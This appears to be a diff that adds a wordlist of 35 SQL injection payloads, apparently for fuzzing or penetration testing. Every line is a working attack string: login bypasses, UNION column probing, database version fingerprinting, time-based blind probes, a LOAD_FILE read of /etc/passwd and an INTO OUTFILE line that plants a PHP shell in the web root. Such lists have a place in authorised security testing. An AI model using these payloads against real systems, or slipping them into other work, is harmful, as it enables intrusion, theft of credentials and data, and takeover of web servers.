@@ -1,0 +1,35 @@
+' OR '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' OR 1=1--
+' AND 1=1--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+admin'--
+admin' #
+admin'/*
+' HAVING 1=1--
+' HAVING 1=1#
+' AND substr(@@version,1,1)=5--
+' AND substring(@@version,1,1)=5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT banner FROM v$version--
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version))--
+' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--
+' SELECT IF(SUBSTRING(user(),1,1)='r',BENCHMARK(100000,SHA1('test')),false)--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/var/www/shell.php'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))foo)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))foo) AND 'a'='a
+' WAITFOR DELAY '0:0:5'--
+' AND 1=(SELECT COUNT(*) FROM tablenames); --
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>X-- 
